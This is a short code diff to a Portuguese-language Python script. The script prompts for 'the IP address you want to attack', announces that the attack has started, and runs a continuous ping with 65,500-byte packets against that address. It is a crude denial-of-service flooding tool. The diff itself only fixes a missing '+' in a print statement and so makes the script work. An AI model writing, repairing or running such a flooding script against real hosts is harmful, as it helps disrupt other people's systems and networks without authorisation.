@@ -20,7 +20,7 @@ def script():
     print("\n")
     ip=input("Digite o endereço de ip que deseja atacar: "+azul)
     time.sleep(1)
-    print(vermelho+"Para parar o ataque, aperte"azul+" ctrl+c")
+    print(vermelho+"Para parar o ataque, aperte"+azul+" ctrl+c")
     print("Ataque iniciado...")
     os.system("Ping -t -l 65500 "+ip)
 script()
